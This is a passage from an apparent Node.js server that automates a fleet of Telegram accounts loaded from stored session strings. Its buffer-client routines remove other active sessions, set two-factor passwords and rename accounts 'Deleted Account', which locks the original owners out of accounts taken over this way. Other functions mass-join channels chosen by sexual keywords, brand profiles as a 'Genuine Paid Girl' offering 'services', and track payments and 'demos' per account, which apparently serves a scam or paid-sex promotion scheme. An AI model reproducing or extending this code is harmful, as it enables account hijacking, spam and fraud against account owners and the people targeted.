  const checker = checkerclass.getinstance()
  checker.restart(userName.toLowerCase());
});

app.get('/receiveNumber/:num', async (req, res, next) => {
  res.send('Hello World!');
  next();
}, async (req, res) => {
  try {
    const userName = req.query.userName;
    const num = parseInt(req.params.num);
    const data = userMap.get(userName.toLowerCase());
    if (data) {
      await fetchWithTimeout(`${data.url}receiveNumber/${num}`, { timeout: 7000 });
    }
  } catch (error) {
    console.log("Some Error: ", error.code);
  }
});

app.get('/tgclientoff/:num', async (req, res, next) => {
  res.send('Hello World!');
  next();
}, async (req, res) => {
  try {
    const userName = req.query.userName;
    const processId = req.params.num;
    console.log(new Date(Date.now()).toLocaleString('en-IN', timeOptions), 'Req receved from: ', req.query.url, " : ", userName, ' - ', processId)

    try {
      const data = userMap.get(userName.toLowerCase());
      const url = data?.url;
      if (url) {
        const connectResp = await fetchWithTimeout(`${url}getprocessid`, { timeout: 10000 });
        if (connectResp.data.ProcessId === processId) {
          userMap.set(userName.toLowerCase(), { ...data, timeStamp: Date.now(), downTime: 0, lastPingTime: Date.now() });
          pushToconnectionQueue(userName, processId)
        } else {
          console.log(`Actual Process Id from ${url}getprocessid : `, connectResp.data.ProcessId);
          console.log("Request received from Unknown process")
        }
      }
    } catch (error) {
      console.log("Some Error: ", error)
    }

  } catch (error) {
    console.log("Some Error: ", error);
  }
});


app.get('/joinchannel', async (req, res, next) => {
  res.send('Hello World!');
  next();
}, async (req, res) => {
  try {
    const userName = req.query.userName;
    if (userName) {
      const data = userMap.get(userName.toLowerCase());
      if (data) {
        joinchannels(data)
      } else {
        console.log(new Date(Date.now()).toLocaleString('en-IN', timeOptions), `User ${userName} Not exist`);
      }
    } else {
      Array.from(userMap.values()).map(async (value) => {
        try {
          joinchannels(value);
          await sleep(3000);
        } catch (error) {
          console.log("Some Error: ", error.code);
        }
      })
    }
  } catch (error) {
    console.log("Some Error: ", error);
  }
});

app.get('/joinchannelBf', async (req, res, next) => {
  res.send('Hello World!');
  next();
}, async (req, res) => {
  try {
    joinchannelForBufferClients()
  } catch (error) {
    console.log("Some Error: ", error.code);
  }
});

app.get('/requestcall', async (req, res, next) => {
  res.send('Hello World!');
  next();
}, async (req, res) => {
  try {
    const userName = req.query.userName;
    const chatId = req.query.chatId;
    const user = userMap.get(userName.toLowerCase());
    // await fetchWithTimeout(`${ppplbot()}&text=Call Request Recived: ${userName} | ${chatId}`);
    console.log(`Call Request Recived: ${userName} | ${chatId}`)
    if (user) {
      setTimeout(async () => {
        try {
          const data = await fetchWithTimeout(`${user.url}requestcall/${chatId}`, { timeout: 7000 });
          if (data.data) {
            console.log(`Call Request Sent: ${userName} | ${chatId}`)
            setTimeout(async () => {
              try {
                const data = await fetchWithTimeout(`${user.url}requestcall/${chatId}`, { timeout: 7000 });
                setTimeout(async () => {
                  await fetchWithTimeout(`${user.url}sendMessage/${chatId}?msg=Not Connecting!!, Don't worry I will try again in sometime!! okay!!`, { timeout: 7000 });
                }, 3 * 60 * 1000);
              } catch (error) {
                console.log(error)
              }
            }, 2 * 60 * 1000);
          } else {
            console.log(`Call Request Sent Not Sucess: ${userName} | ${chatId}`);
          }
        } catch (error) {
          console.log("Failed", user);
        }

      }, 3 * 60 * 1000);
    } else {
      console.log("USer not exist!!")
    }
  } catch (error) {
    console.log("Some Error: ", error.code);
  }
});
const nestApp = await NestFactory.create(AppModule, new ExpressAdapter(app));

const config = new DocumentBuilder()
  .setTitle('NestJS and Express API')
  .setDescription('API documentation')
  .setVersion('1.0')
  .build();
const document = SwaggerModule.createDocument(nestApp, config);
// fs.writeFileSync('./swagger-spec.json', JSON.stringify(document, null, 2));
SwaggerModule.setup('api', nestApp, document);
mongoose.set('debug', true)
await nestApp.init();

app.listen(port, async () => {
  console.log(`Example app listening at http://localhost:${port}`)
});

class checkerclass {
  static instance = undefined;

  constructor() {
    this.main();
  };

  static getinstance() {
    if (!checkerclass.instance) {
      console.log('creating instance-------')
      checkerclass.instance = new checkerclass();
    }
    return checkerclass.instance;
  }
  main() {

  }

  async restart(userName, processId) {
    const data = userMap.get(userName);
    console.log(data, userName);
    const url = data?.url;
    if (url) {
      userMap.set(userName, { ...data, timeStamp: Date.now() });
      try {
        //await fetchWithTimeout(`${ ppplbot() }& text=${ userName } is DOWN!!`, { timeout: 10000 });
        //await fetchWithTimeout(`${ url } `, { timeout: 10000 });
        try {
          console.log('Checking Health')
          const resp = await fetchWithTimeout(`${url} checkHealth`, { timeout: 10000 });
          if (resp.status === 200 || resp.status === 201) {
            if (resp.data.status === apiResp.ALL_GOOD || resp.data.status === apiResp.WAIT) {
              console.log(resp.data.userName, ': All good');
            } else {
              console.log(resp.data.userName, ': DIAGNOSE - HealthCheck - ', resp.data.status);
              await fetchWithTimeout(`${ppplbot()}&text=${(resp.data.userName).toUpperCase()}:HealthCheckError-${resp.data.status}`);
              try {
                const connectResp = await fetchWithTimeout(`${url}tryToConnect/${processId}`, { timeout: 10000 });
                console.log(connectResp.data.userName, ': RetryResp - ', connectResp.data.status);
                await fetchWithTimeout(`${ppplbot()}&text=${(connectResp.data.userName).toUpperCase()}:RetryResponse-${connectResp.data.status}`);
              } catch (e) {
                console.log(url, `CONNECTION RESTART FAILED!!`);
              }
            }
          } else {
            console.log(url, `is unreachable!!`);
          }
        } catch (e) {
          console.log(url, `is unreachable!!`);
          //console.log(e)
        }
      }
      catch (e) {
        console.log(e)
      }
    }
    else {
      console.log('url is undefined');
    }
  }
}
async function joinchannels(value) {
  try {
    let resp = await fetchWithTimeout(`${value.url}channelinfo`, { timeout: 200000 });
    await fetchWithTimeout(`${(ppplbot())}&text=ChannelCount SendTrue - ${value.clientId}: ${resp.data.canSendTrueCount}`)
    if (resp?.data?.canSendTrueCount && resp?.data?.canSendTrueCount < 250) {
      await fetchWithTimeout(`${ppplbot()}&text=Started Joining Channels- ${value.clientId}`)
      const keys = ['wife', 'adult', 'lanj', 'lesb', 'paid', 'randi', 'coupl', 'cpl', 'bhab', 'boy', 'girl', 'friend', 'frnd', 'boob', 'pussy', 'dating', 'swap', 'gay', 'sex', 'bitch', 'love', 'video', 'service', 'real', 'call', 'desi'];
      const db = ChannelService.getInstance();
      const channels = await db.getActiveChannels(100, 0, keys, resp.data?.ids, 'activeChannels');
      for (const channel of channels) {
        try {
          console.log(channel.username);
          const username = channel?.username?.replace("@", '');
          if (username) {
            fetchWithTimeout(`${value.url}joinchannel?username=${username}`);
            await sleep(200000);
          }
        } catch (error) {
          console.log("Some Error: ", error)
        }
      }
    }
  } catch (error) {
    console.log(error)
  }
}


async function getPromotionStatsPlain() {
  let resp = '';
  const db = ChannelService.getInstance();
  const result = await db.readPromoteStats();
  for (const data of result) {
    resp += `${data.client.toUpperCase()} : ${data.totalCount} ${data.totalCount > 0 ? ` | ${Number((Date.now() - data.lastUpdatedTimeStamp) / (1000 * 60)).toFixed(2)}` : ''}`;
  }
  return resp;
}

async function getPromotionStats() {
  let resp = '';
  const db = ChannelService.getInstance();
  const result = await db.readPromoteStats();
  for (const data of result) {
    resp += `${data.client.toUpperCase()} : <b>${data.totalCount}</b>${data.totalCount > 0 ? ` | ${Number((Date.now() - data.lastUpdatedTimeStamp) / (1000 * 60)).toFixed(2)}` : ''}<br>`;
  }
  return resp;
}

async function getPromotionStatsHtml() {
  let resp = '<html><head><style>pre { font-size: 18px; }</style></head><body><pre>';
  resp = resp + await getPromotionStats();
  resp += '</pre></body></html>';
  return resp;
}

function isDateInPast(dateStr) {
  const today = new Date();
  const [day, month, year] = dateStr.split('-').map(Number);
  const inputDate = new Date(year, month - 1, day); // Note: Month is 0-based in JavaScript

  return inputDate < today;
}

async function getData() {
  const profileData = await createInitializedObject();
  const db = await ChannelService.getInstance();
  let entries = await db.readStats();
  // console.log(Object.keys(profileData));
  for (const entry of entries) {
    const { count, newUser, payAmount, demoGivenToday, demoGiven, profile, client, name, secondShow } = entry;

    // console.log(profile.toUpperCase(), profileData[profile.toUpperCase()])
    if (client && profileData[client.toUpperCase()]) {
      const userData = profileData[client.toUpperCase()];
      userData.totalCount += count;
      userData.totalPaid += payAmount > 0 ? 1 : 0;
      userData.totalOldPaid += (payAmount > 0 && !newUser) ? 1 : 0;
      userData.oldPaidDemo += (demoGivenToday && !newUser) ? 1 : 0;
      userData.totalpendingDemos += (payAmount > 25 && !demoGiven) ? 1 : 0;
      userData.oldPendingDemos += (payAmount > 25 && !demoGiven && !newUser) ? 1 : 0;
      if (payAmount > 25 && !demoGiven) {
        userData.names = userData.names + ` ${name} |`
      }

      if (demoGiven && ((payAmount > 90 && !secondShow) || (payAmount > 150 && secondShow))) {
        userData.fullShowPPl++;
        userData.fullShowNames = userData.fullShowNames + ` ${name} |`
      }

      if (newUser) {
        userData.totalNew += 1;
        userData.totalNewPaid += payAmount > 0 ? 1 : 0;
        userData.newPaidDemo += demoGivenToday ? 1 : 0;
        userData.newPendingDemos += (payAmount > 25 && !demoGiven) ? 1 : 0;
      }
    }
  }
  const profileDataArray = Object.entries(profileData);
  profileDataArray.sort((a, b) => b[1].totalpendingDemos - a[1].totalpendingDemos);
  let reply = '';
  for (const [profile, userData] of profileDataArray) {
    reply += `${profile.toUpperCase()} : <b>${userData.totalpendingDemos}</b> | ${userData.names}<br>`;
  }

  profileDataArray.sort((a, b) => b[1].fullShowPPl - a[1].fullShowPPl);
  let reply2 = '';
  for (const [profile, userData] of profileDataArray) {
    reply2 += `${profile.toUpperCase()} : <b>${userData.fullShowPPl}</b> |${userData.fullShowNames}<br>`;
  }

  let reply3 = await getPromotionStats()

  return (
    `<div>
      <div style="display: flex; margin-bottom: 60px">
        <div style="flex: 1;">${reply}</div>
        <div style="flex: 1; ">${reply2}</div>
      </div>
      <div style="display: flex;">
        <div style="flex: 1; " >${reply3}</div>
      </div>
    </div>`
  );

}

let goodIds = [];
let badIds = [];
async function checkBufferClients() {
  const db = await ChannelService.getInstance();
  await disconnectAll()
  await sleep(2000);
  const clients = await db.readBufferClients({});
  goodIds = [];
  badIds = [];
  if (clients.length < 40) {
    for (let i = 0; i < 40 - clients.length; i++) {
      badIds.push(1)
    }
  }
  for (const document of clients) {
    console.log(document)
    const cli = await createClient(document.mobile, document.session);
    if (cli) {
      const client = await getClient(document.mobile);
      const hasPassword = await client.hasPassword();
      if (!hasPassword) {
        badIds.push(document.mobile);
        await db.deleteBufferClient(document);
      } else {
        const channels = await client.channelInfo(true);
        await db.insertInBufferClients({ mobile: document.mobile, channels: channels.ids.length });
        console.log(document.mobile, " :  ALL Good");
        goodIds.push(document.mobile)
      }
      await client.disconnect();
      await deleteClient(document.mobile)
      await sleep(2000);
    } else {
      console.log(document.mobile, " :  false");
      badIds.push(document.mobile);
      await db.deleteBufferClient(document)
    }
  }
  console.log(badIds, goodIds);
  await addNewUserstoBufferClients();
}

async function addNewUserstoBufferClients() {
  const db = await ChannelService.getInstance();
  const cursor = await db.getNewBufferClients(goodIds);
  while (badIds.length > 0) {
    try {
      if (cursor.hasNext()) {
        const document = await cursor.next();
        const cli = await createClient(document.mobile, document.session);
        if (cli) {
          const client = await getClient(document.mobile);
          const hasPassword = await client.hasPassword();
          console.log("hasPassword: ", hasPassword);
          if (!hasPassword) {
            await client.removeOtherAuths();
            await client.set2fa();
            console.log("waiting for setting 2FA");
            await sleep(35000);
            await client.updateUsername();
            await sleep(5000)
            await client.updatePrivacyforDeletedAccount();
            await sleep(5000)
            await client.updateProfile("Deleted Account", "Deleted Account");
            await sleep(5000)
            await client.deleteProfilePhotos();
            await sleep(5000)
            console.log("Inserting Document");
            document['date'] = (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0]
            await db.insertInBufferClients(document);
            await client.disconnect();
            await deleteClient(document.mobile)
            badIds.pop();
          } else {
            await db.updateUser(document, { twoFA: true });
            await client.disconnect();
            await deleteClient(document.mobile)
          }
        } else {
          // await db.deleteUser(document);
        }
      } else {
        console.log("Cursor Does not have Next");
      }
    } catch (error) {
      console.error("An error occurred:", error);
    }
  }
  setTimeout(() => {
    joinchannelForBufferClients()
  }, 2 * 60 * 1000);
}

async function checkArchivedClients() {
  const db = await ChannelService.getInstance();
  await disconnectAll()
  await sleep(2000);
  const clients = await db.readArchivedClients({});
  for (const document of clients) {
    console.log(document)
    const cli = await createClient(document.mobile, document.session);
    if (!cli) {
      console.log(document.mobile, " :  false");
      badIds.push(document.mobile);
      await db.removeOneAchivedClient({ number: document.number })
    }
  }
}


async function updateClient(clientId) {
  try {
    const db = await ChannelService.getInstance();
    await disconnectAll();
    await sleep(2000);
    const oldClient = await db.getUserConfig({ clientId })
    if (oldClient) {
      try {
        const oldClientUser = await db.getUser({ mobile: (oldClient?.mobile.toString()).replace("+", '') });
        if (oldClientUser) {
          const cli = await createClient(oldClientUser?.mobile, oldClientUser?.session);
          if (cli) {
            const client = await getClient(oldClientUser.mobile);
            await CloudinaryService.getInstance(oldClient?.dbcoll?.toLowerCase());
            // const userCaps = username[0].toUpperCase() + username.slice(1)
            // await client.updateUsername(`${userCaps}Redd`);
            await sleep(2000)
            await client.updateProfile(oldClient.name, "Genuine Paid Girl🥰, Best Services❤️");
            await sleep(3000)
            await client.deleteProfilePhotos();
            await sleep(3000)
            await client.updatePrivacy();
            await sleep(3000)
            await client.updateProfilePic(path.join(__dirname, '../dp1.jpg'));
            await sleep(3000);
            await client.updateProfilePic(path.join(__dirname, '../dp2.jpg'));
            await sleep(3000);
            await client.updateProfilePic(path.join(__dirname, '../dp3.jpg'));
            await sleep(2000);
            await client.disconnect(oldClientUser.mobile)
          }
        }
      } catch (error) {
        console.log("Error updateing settings of old Client - ", error);
      }
    }
  } catch (e) {

  }
}
async function setUpClient(clientId, archieveOld, days = 0, mobile = null, formalities = true, pLimited = false) {
  try {
    const db = await ChannelService.getInstance();
    const oldClient = await db.getUserConfig({ clientId })
    let oldClienttg;
    if (archieveOld && oldClient) {
      try {
        const oldClientUser = await db.getUser({ mobile: (oldClient?.number.toString()).replace("+", '') });
        if (oldClientUser) {
          const cli = await createClient(oldClientUser?.mobile, oldClientUser?.session, false);
          if (cli) {
            oldClienttg = await getClient(oldClientUser.mobile);
            // await oldClienttg.updateProfile("Deleted Account", `New ACC https://${oldClient.link}`);
            // await sleep(5000)
            await oldClienttg.deleteProfilePhotos();
            await sleep(3000)
            await oldClienttg.updatePrivacyforDeletedAccount();
            await sleep(2000)
            await oldClienttg.updateUsername()
          }
        }
        delete oldClientUser["_id"];
        if (!pLimited) {
          oldClientUser['date'] = (new Date(Date.now() + (days * 24 * 60 * 60 * 1000))).toISOString().split('T')[0]
          await db.insertInBufferClients({ ...oldClientUser })
        }
      } catch (error) {
        console.log("Error updateing settings of old Client - ", error);
        await fetchWithTimeout(`${ppplbot()}&text=Error updateing settings of old Client - ${clientId}`);
      }
      delete oldClient['_id']
      oldClient['insertedDate'] = new Date().toISOString().split('T')[0]
      oldClient['pLimited'] = pLimited
      await db.insertInAchivedClient(oldClient);
      await fetchWithTimeout(`${ppplbot()}&text=Archived Old Client ${clientId}`);
      console.log("Archived old client");
    }

    const newClient = await db.getOneBufferClient(mobile);

    await deleteClient(newClient?.mobile)
    await sleep(2000);
    if (newClient) {
      const cli = await createClient(newClient.mobile, newClient.session, false);
      if (cli) {
        const client = await getClient(newClient.mobile);
        let newUsername
        setActiveClientSetup({ phoneNumber: newClient.mobile, clientId });
        if (formalities) {
          const username = (clientId?.match(/[a-zA-Z]+/g)).toString();
          const userCaps = username[0].toUpperCase() + username.slice(1);
          newUsername = await client.updateUsername(`${userCaps}Redd`);
          if (archieveOld && oldClienttg) {
            oldClienttg?.updateProfile("Deleted Account", `New ACC: @${newUsername}`);
          }
        }
        await sleep(2000)
        const existingData = await db.getInAchivedClient({ number: `+${newClient.mobile}` });
        if (existingData) {
          await fetchWithTimeout(`${ppplbot()}&text=Setting UP from archives - ${clientId}-${newUsername}-${newClient.mobile}`);
          console.log("Data Existing already");
          await setNewClient({ ...existingData, userName: newUsername }, { clientId });
          await db.removeOneAchivedClient({ number: `+${newClient.mobile}` });
        } else {
          await fetchWithTimeout(`${ppplbot()}&text=Generating new Session -  ${clientId}-${newUsername}-${newClient.mobile}`);
          await generateNewSession(newClient.mobile);
          setTimeout(async () => {
            const stillExists = await db.getOneBufferClient(newClient.mobile);
            if (stillExists) {
              console.log("Removeing buff client as failed to update")
              stillExists['date'] = (new Date(Date.now() + (30 * 24 * 60 * 60 * 1000))).toISOString().split('T')[0]
              await db.insertInBufferClients({ ...stillExists })
            }
          }, 150000);
        }
      }
    } else {
      console.log("New client does not exist")
    }
  } catch (error) {
    console.log(error)
  }
}
async function generateNewSession(phoneNumber) {
  try {
    console.log("String Generation started");
    await sleep(1000);
    const response = await fetchWithTimeout(`https://tgsignup.onrender.com/login?phone=${phoneNumber.toString()}&force=${true}`, { timeout: 15000 }, 1);
    if (response) {
      console.log(`Code Sent successfully`, response);
      await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`Code Sent successfully-${response}-${phoneNumber}`)}`);
    } else {
      console.log(`Failed to send Code-${JSON.stringify(response)}`);
      await sleep(5000);
      await generateNewSession(phoneNumber);
    }
  } catch (error) {
    console.log(error)
  }
}
async function setNewClient(user, activeClientSetup) {
  try {
    console.log("Setting data for:", user, activeClientSetup)
    const clientId = activeClientSetup.clientId;
    const db = await ChannelService.getInstance();
    let mainAccount = user.userName?.replace("@", '')
    if (fetchNumbersFromString(clientId) == "2") {
      const mainUser = await db.getUserConfig({ clientId: clientId.replace("2", "1") });
      mainAccount = mainUser.userName;
    } else {
      const client2 = clientId.replace("1", "2")
      const data = await db.updateUserConfig({ clientId: client2 }, { mainAccount: mainAccount });
      if (data) {
        console.log(client2, " -  ", data)
        console.log(`updated ${client2}'s MainAccount with ${mainAccount}`);
        // if (data.userName) {
        //   try {
        //     await fetchWithTimeout(`${process.env.uptimeChecker}/disconnectUser?userName=${data.userName}`);
        //   } catch (error) {

        //   }
        // }
      }
    }
    const updatedClient = await db.updateUserConfig({ clientId: activeClientSetup.clientId }, { session: user.session, number: user.number ? user.number : `+${user.mobile}`, userName: user.userName?.replace("@", ''), mainAccount: mainAccount });
    console.log("Updated the Client Successfully", activeClientSetup.phoneNumber, updatedClient);
    await db.deleteBufferClient({ mobile: activeClientSetup.phoneNumber });
    await fetchWithTimeout(`${process.env.uptimeChecker}/forward/updateclient/${clientId}`);
    await fetchWithTimeout(`${ppplbot()}&text=Update Done - ${user.clientId}-${user.userName}-${user.number}-${user.name}`);
    console.log(activeClientSetup.clientId, " -  ", updatedClient)
    if (updatedClient?.userName) {
      try {
        await fetchWithTimeout(`${process.env.uptimeChecker}/disconnectUser?userName=${updatedClient.userName}`);
      } catch (error) {
        console.log(error);
      }
    }
    await setUserMap();
    try {
      await fetchWithTimeout(`${process.env.uptimeChecker}/refreshmap`);
    } catch (error) {
      console.log(error);
    }
  } catch (error) {
    console.log(error);;
  }
}


async function joinchannelForBufferClients() {
  const db = ChannelService.getInstance();
  await disconnectAll();
  await sleep(2000);
  const clients = await db.readBufferClients({ channels: { "$lt": 180 } }, 4)
  for (const document of clients) {
    const cli = await createClient(document.mobile, document.session, false);
    if (cli) {
      const client = await getClient(document.mobile);
      const channels = await client.channelInfo(true);
      const keys = ['wife', 'adult', 'lanj', 'lesb', 'paid', 'coupl', 'cpl', 'randi', 'bhab', 'boy', 'girl', 'friend', 'frnd', 'boob', 'pussy', 'dating', 'swap', 'gay', 'sex', 'bitch', 'love', 'video', 'service', 'real', 'call', 'desi'];
      const result = await db.getActiveChannels(150, 0, keys, channels.ids, "channels");
      console.log("DbChannelsLen: ", result.length);
      let resp = '';
      for (const channel of result) {

        resp = resp + (channel?.username?.startsWith("@") ? channel.username : `@${channel.username}`) + "|";
      }
      client.joinChannels(resp);
    }
  }
}

function pushToconnectionQueue(userName, processId) {
  const existingIndex = connetionQueue.findIndex(entry => entry.userName === userName);
  if (existingIndex !== -1) {
    connetionQueue[existingIndex].processId = processId;
  } else {
    connetionQueue.push({ userName, processId });
  }
}
